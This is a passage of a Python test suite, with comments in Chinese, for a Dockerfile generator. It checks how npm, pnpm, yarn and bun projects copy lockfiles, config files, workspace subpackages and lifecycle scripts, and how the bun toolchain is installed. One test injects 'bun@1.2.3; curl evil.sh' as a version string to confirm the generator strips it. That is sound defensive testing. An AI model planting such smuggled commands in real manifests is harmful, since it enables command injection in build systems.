    current = workspace.app_current("bug856d")
    server = current / "server"
    server.mkdir(parents=True)
    (server / "package.json").write_text(
        json.dumps({"scripts": {"preinstall": "sh probe.sh", "start": "node server.js"}}),
        encoding="utf-8",
    )
    (server / "probe.sh").write_text("#!/bin/sh\n", encoding="utf-8")

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "COPY current/server/probe.sh probe.sh" in text
    assert text.index("COPY current/server/probe.sh") < text.index("RUN npm ci")


def test_yarn_berry_project_copies_yarnrc_and_yarn_dir(workspace) -> None:
    """BUG-874：Yarn Berry 项目依赖层必须带 .yarnrc.yml 与 .yarn/（patches/releases），否则 patch: 依赖 YN0001。"""
    manifest = _node_manifest("bug874a")
    manifest.entry.install = "corepack enable && yarn install --frozen-lockfile"
    current = workspace.app_current("bug874a")
    current.mkdir(parents=True, exist_ok=True)
    (current / "package.json").write_text(json.dumps({"name": "hd", "scripts": {"start": "node app.js"}}), encoding="utf-8")
    (current / "yarn.lock").write_text("__metadata:\n  version: 8\n", encoding="utf-8")
    (current / ".yarnrc.yml").write_text("nodeLinker: node-modules\nyarnPath: .yarn/releases/yarn-4.13.0.cjs\n", encoding="utf-8")
    (current / ".yarn" / "patches").mkdir(parents=True)
    (current / ".yarn" / "patches" / "passport.patch").write_text("diff", encoding="utf-8")

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "COPY current/package.json current/yarn.lock ./" in text
    assert "COPY current/.yarnrc.yml ./" in text
    assert "COPY current/.yarn/ .yarn/" in text
    assert text.index("COPY current/.yarnrc.yml") < text.index("RUN corepack enable && yarn install")


def test_yarn1_project_without_berry_files_unchanged(workspace) -> None:
    """Yarn 1 项目（无 .yarnrc.yml/.yarn/）渲染与 BUG-874 前逐字一致。"""
    manifest = _node_manifest("bug874b")
    manifest.entry.install = "corepack enable && yarn install --frozen-lockfile"
    current = workspace.app_current("bug874b")
    current.mkdir(parents=True, exist_ok=True)
    (current / "package.json").write_text(json.dumps({"name": "y1", "scripts": {"start": "node app.js"}}), encoding="utf-8")
    (current / "yarn.lock").write_text("# yarn lockfile v1\n", encoding="utf-8")
    (current / ".yarnrc").write_text("registry https://registry.npmmirror.com\n", encoding="utf-8")

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "COPY current/package.json current/yarn.lock ./" in text
    assert "COPY current/.yarnrc ./" in text
    assert ".yarnrc.yml" not in text
    assert "COPY current/.yarn/" not in text


def test_pnpm_workspace_project_copies_workspace_yaml(workspace) -> None:
    """pnpm monorepo 依赖层须带 pnpm-workspace.yaml；.npmrc 存在时同样携带。"""
    manifest = _node_manifest("bug874c")
    manifest.entry.install = "corepack enable && pnpm install --frozen-lockfile"
    current = workspace.app_current("bug874c")
    current.mkdir(parents=True, exist_ok=True)
    (current / "package.json").write_text(json.dumps({"name": "mono", "scripts": {"start": "node app.js"}}), encoding="utf-8")
    (current / "pnpm-lock.yaml").write_text("lockfileVersion: '9.0'\n", encoding="utf-8")
    (current / "pnpm-workspace.yaml").write_text("packages:\n  - packages/*\n", encoding="utf-8")
    (current / ".npmrc").write_text("legacy-peer-deps=true\n", encoding="utf-8")

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "COPY current/package.json current/pnpm-lock.yaml ./" in text
    assert "COPY current/pnpm-workspace.yaml ./" in text
    assert "COPY current/.npmrc ./" in text


def test_npm_project_with_npmrc_copies_it_into_deps_layer(workspace) -> None:
    """npm 项目根级 .npmrc（如 legacy-peer-deps=true）随依赖层先于 npm ci 复制。"""
    manifest = _node_manifest("bug874d")
    current = workspace.app_current("bug874d")
    current.mkdir(parents=True, exist_ok=True)
    (current / "package.json").write_text(json.dumps({"name": "n", "scripts": {"start": "node app.js"}}), encoding="utf-8")
    (current / "package-lock.json").write_text("{}\n", encoding="utf-8")
    (current / ".npmrc").write_text("legacy-peer-deps=true\n", encoding="utf-8")

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "COPY current/.npmrc ./" in text
    assert text.index("COPY current/.npmrc ./") < text.index("RUN npm ci")


# ---- 评审 P2（BUG-873 补齐）：bun 容器工具链与锁文件复制 --------------------------


def _bun_manifest(mid: str = "bundemo") -> InstanceManifest:
    manifest = make_container_manifest(mid, kind=Kind.NODE)
    manifest.entry = EntryConfig(
        install="bun install --frozen-lockfile", start="bun run src/index.ts"
    )
    return manifest


def _bun_project(
    current,
    *,
    package_manager: str | None = None,
    lock: str = "bun.lock",
    workspaces: list[str] | None = None,
    bunfig: bool = False,
) -> None:
    pkg: dict = {"name": "bun-app", "scripts": {"start": "bun run src/index.ts"}}
    if package_manager:
        pkg["packageManager"] = package_manager
    if workspaces:
        pkg["workspaces"] = workspaces
    (current / "package.json").write_text(json.dumps(pkg), encoding="utf-8")
    (current / lock).write_text("# bun lockfile\n", encoding="utf-8")
    if bunfig:
        (current / "bunfig.toml").write_text("[install]\n", encoding="utf-8")


def test_bun_install_adds_toolchain_and_lock_copy(workspace) -> None:
    """评审 P2：bun 项目走 node:24-alpine 必须先补 bun 工具链（版本取
    packageManager 的 bun@<ver>），且依赖层复制 bun.lock* 而非 package*.json。"""
    manifest = _bun_manifest("bun873a")
    current = workspace.app_current("bun873a")
    current.mkdir(parents=True, exist_ok=True)
    _bun_project(current, package_manager="bun@1.4.2")

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "RUN npm install -g bun@1.4.2" in text
    bun_install = next(
        line
        for line in text.splitlines()
        if line.startswith("RUN bun install") and "--frozen-lockfile" in line
    )
    assert text.index("RUN npm install -g bun@1.4.2") < text.index(bun_install)
    assert "COPY current/package.json current/bun.lock* ./" in text
    assert "COPY current/package*.json ./" not in text


def test_bun_package_manager_strips_integrity_suffix(workspace) -> None:
    """packageManager 的 +sha 校验后缀不得传给 npm install -g。

    Corepack 规范允许 ``bun@1.2.3+sha512...``；npm 的 ``bun@<ver>`` 只接受纯版本号。
    """
    manifest = _bun_manifest("bun873sha")
    current = workspace.app_current("bun873sha")
    current.mkdir(parents=True, exist_ok=True)
    _bun_project(current, package_manager="bun@1.2.3+sha512.abcdef")

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "RUN npm install -g bun@1.2.3\n" in text
    assert "+sha" not in text


def test_bun_package_manager_non_version_chars_falls_back_to_latest(workspace) -> None:
    """BUG-897：packageManager 版本号含白名单外字符时按未声明处理、装最新
    bun——版本号直接拼进 RUN，注入串不得进入 Dockerfile。"""
    manifest = _bun_manifest("bun897")
    current = workspace.app_current("bun897")
    current.mkdir(parents=True, exist_ok=True)
    _bun_project(current, package_manager="bun@1.2.3; curl evil.sh")

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "RUN npm install -g bun\n" in text
    assert "curl evil" not in text


def test_bun_without_package_manager_installs_latest(workspace) -> None:
    """未声明 packageManager 时装最新 bun（不拼 @ 版本号）。"""
    manifest = _bun_manifest("bun873b")
    current = workspace.app_current("bun873b")
    current.mkdir(parents=True, exist_ok=True)
    _bun_project(current, lock="bun.lockb")

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "RUN npm install -g bun\n" in text
    assert "COPY current/package.json current/bun.lock* ./" in text


def test_bun_workspace_monorepo_copies_subpackage_jsons_and_bunfig(workspace) -> None:
    """bun workspaces monorepo：子包 package.json 与 bunfig.toml 随依赖层复制。"""
    manifest = _bun_manifest("bun873c")
    current = workspace.app_current("bun873c")
    current.mkdir(parents=True, exist_ok=True)
    _bun_project(current, workspaces=["packages/*"], bunfig=True)
    sub = current / "packages" / "api"
    sub.mkdir(parents=True)
    (sub / "package.json").write_text(json.dumps({"name": "api"}), encoding="utf-8")

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "COPY current/packages/api/package.json packages/api/package.json" in text
    assert "COPY current/bunfig.toml ./" in text


def test_non_bun_install_has_no_bun_toolchain(workspace) -> None:
    """npm 项目不产生 bun 工具链层（渲染逐字不变）。"""
    manifest = _node_manifest("bun873d")
    current = workspace.app_current("bun873d")
    current.mkdir(parents=True, exist_ok=True)
    (current / "package.json").write_text(
        json.dumps({"name": "n", "scripts": {"start": "node app.js"}}), encoding="utf-8"
    )
    (current / "package-lock.json").write_text("{}\n", encoding="utf-8")

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "npm install -g bun" not in text


def test_bun_install_gets_registry_flag() -> None:
    """bun install 与 npm/pnpm/yarn 一样消费 buildMirrors.npm 的 --registry。"""
    from local_webpage_access.config import BuildMirrors
    from local_webpage_access.dockerfile_templates import _with_npm_registry

    mirrors = BuildMirrors(npm="https://registry.npmmirror.com")
    out = _with_npm_registry("bun install --frozen-lockfile", mirrors)
    assert out == "bun install --registry=https://registry.npmmirror.com --frozen-lockfile"


# ---- BUG-888：pnpm/yarn/bun 分支对齐 workspaces 子包拷贝与生命周期前置拷贝 ----


def test_pnpm_monorepo_copies_subpackage_jsons(workspace) -> None:
    """BUG-888：pnpm workspaces 的子包 package.json 必须在依赖层在场（此前
    pnpm 分支提前 return 跳过），glob 取自 pnpm-workspace.yaml。"""
    manifest = _node_manifest("bug888a")
    manifest.entry.install = "corepack enable && pnpm install --frozen-lockfile"
    current = workspace.app_current("bug888a")
    current.mkdir(parents=True, exist_ok=True)
    (current / "package.json").write_text(
        json.dumps({"name": "mono", "scripts": {"start": "node app.js"}}),
        encoding="utf-8",
    )
    (current / "pnpm-lock.yaml").write_text("lockfileVersion: '9.0'\n", encoding="utf-8")
    (current / "pnpm-workspace.yaml").write_text(
        "packages:\n  - packages/*\n", encoding="utf-8"
    )
    for sub in ("packages/api", "packages/web"):
        (current / sub).mkdir(parents=True)
        (current / sub / "package.json").write_text(
            json.dumps({"name": sub.split("/")[-1]}), encoding="utf-8"
        )

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "COPY current/pnpm-workspace.yaml ./" in text
    assert "COPY current/packages/api/package.json packages/api/package.json" in text
    assert "COPY current/packages/web/package.json packages/web/package.json" in text
    assert text.index("COPY current/packages/api/package.json") < text.index(
        "RUN corepack enable && pnpm install"
    )


def test_pnpm_lifecycle_prereq_file_is_copied(workspace) -> None:
    """BUG-888：pnpm 项目的 preinstall 引用文件同样先于 install 复制（此前
    提前 return 使 BUG-850 前置拷贝对 pnpm 是死代码）。"""
    manifest = _node_manifest("bug888b")
    manifest.entry.install = "corepack enable && pnpm install --frozen-lockfile"
    current = workspace.app_current("bug888b")
    current.mkdir(parents=True, exist_ok=True)
    (current / "package.json").write_text(
        json.dumps(
            {"name": "p", "scripts": {"preinstall": "sh probe.sh", "start": "node app.js"}}
        ),
        encoding="utf-8",
    )
    (current / "pnpm-lock.yaml").write_text("lockfileVersion: '9.0'\n", encoding="utf-8")
    (current / "probe.sh").write_text("echo ok\n", encoding="utf-8")

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "COPY current/probe.sh probe.sh" in text
    assert text.index("COPY current/probe.sh") < text.index(
        "RUN corepack enable && pnpm install"
    )


def test_yarn_workspaces_copies_subpackage_jsons(workspace) -> None:
    """BUG-888：yarn workspaces（package.json workspaces 字段）子包
    package.json 随依赖层复制（此前 yarn 分支提前 return 跳过）。"""
    manifest = _node_manifest("bug888c")
    manifest.entry.install = "corepack enable && yarn install --frozen-lockfile"
    current = workspace.app_current("bug888c")
    current.mkdir(parents=True, exist_ok=True)
    (current / "package.json").write_text(
        json.dumps(
            {
                "name": "mono",
                "workspaces": ["packages/*"],
                "scripts": {"start": "node app.js"},
            }
        ),
        encoding="utf-8",
    )
    (current / "yarn.lock").write_text("# yarn lockfile v1\n", encoding="utf-8")
    (current / "packages/lib").mkdir(parents=True)
    (current / "packages/lib" / "package.json").write_text(
        json.dumps({"name": "lib"}), encoding="utf-8"
    )

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "COPY current/packages/lib/package.json packages/lib/package.json" in text
    assert text.index("COPY current/packages/lib/package.json") < text.index(
        "RUN corepack enable && yarn install"
    )


def test_yarn_lifecycle_prereq_dir_is_copied(workspace) -> None:
    """BUG-888：yarn 项目 prepare 脚本引用的目录按顶层组件整拷。"""
    manifest = _node_manifest("bug888d")
    manifest.entry.install = "corepack enable && yarn install --frozen-lockfile"
    current = workspace.app_current("bug888d")
    current.mkdir(parents=True, exist_ok=True)
    (current / "package.json").write_text(
        json.dumps(
            {
                "name": "y",
                "scripts": {"prepare": "node scripts/setup.mjs", "start": "node app.js"},
            }
        ),
        encoding="utf-8",
    )
    (current / "yarn.lock").write_text("# yarn lockfile v1\n", encoding="utf-8")
    (current / "scripts").mkdir()
    (current / "scripts" / "setup.mjs").write_text("console.log(1)\n", encoding="utf-8")

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "COPY current/scripts/ scripts/" in text
    assert text.index("COPY current/scripts/") < text.index(
        "RUN corepack enable && yarn install"
    )


def test_bun_lifecycle_prereq_file_is_copied(workspace) -> None:
    """BUG-888：bun 项目的 install 生命周期引用文件同样先于 bun install 复制。"""
    manifest = _bun_manifest("bug888e")
    current = workspace.app_current("bug888e")
    current.mkdir(parents=True, exist_ok=True)
    _bun_project(current)
    pkg = json.loads((current / "package.json").read_text(encoding="utf-8"))
    pkg["scripts"]["preinstall"] = "node scripts/ensure.mjs"
    (current / "package.json").write_text(json.dumps(pkg), encoding="utf-8")
    (current / "scripts").mkdir()
    (current / "scripts" / "ensure.mjs").write_text("console.log(1)\n", encoding="utf-8")

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert "COPY current/scripts/ scripts/" in text
    assert text.index("COPY current/scripts/") < text.index("RUN bun install")


def test_npm_workspaces_follow_source_subdir(workspace) -> None:
    """BUG-888：npm workspaces 的 glob/relative_to 按 COPY 前缀对应的工程根
    解析——sourceSubdir=server 时子包 COPY 为 current/server/packages/...，
    不再用仓库根错位。"""
    manifest = _node_manifest("bug888f")
    manifest.sourceSubdir = "server"
    current = workspace.app_current("bug888f")
    server = current / "server"
    server.mkdir(parents=True)
    (server / "package.json").write_text(
        json.dumps(
            {
                "name": "mono",
                "workspaces": ["packages/*"],
                "scripts": {"start": "node server.js"},
            }
        ),
        encoding="utf-8",
    )
    (server / "package-lock.json").write_text("{}\n", encoding="utf-8")
    (server / "packages/api").mkdir(parents=True)
    (server / "packages/api" / "package.json").write_text(
        json.dumps({"name": "api"}), encoding="utf-8"
    )
    # 仓库根的辅助 package.json 不得参与子包解析
    (current / "package.json").write_text(
        json.dumps({"workspaces": ["rootonly/*"]}), encoding="utf-8"
    )
    (current / "rootonly/x").mkdir(parents=True)
    (current / "rootonly/x" / "package.json").write_text(
        json.dumps({"name": "x"}), encoding="utf-8"
    )

    text = generate_dockerfile(manifest, workspace).read_text(encoding="utf-8")
    assert (
        "COPY current/server/packages/api/package.json packages/api/package.json" in text
    )
    assert "rootonly" not in text
